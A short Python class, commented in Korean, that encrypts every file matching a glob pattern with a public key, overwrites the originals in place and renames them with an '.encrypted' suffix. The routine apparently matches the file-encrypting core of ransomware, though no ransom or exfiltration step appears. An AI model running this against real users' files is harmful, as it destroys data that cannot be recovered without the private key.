import glob
import os
from encryption import Encryption

class FileEncryptor:
    def __init__(self, public_key):
        self.encryptor = Encryption(public_key)

    def encrypt(self, target):
        file_list = glob.glob(target)
        for file in file_list:
            with open(file, 'rb') as f:
                encrypted_file = self.encryptor.encrypt(f.read())

            with open(file, 'wb') as f:
                f.write(encrypted_file) # 파일 암호화

            new_name = file + ".encrypted"
            os.rename(file, new_name) # 파일의 이름 뒤에 .encrypted 추가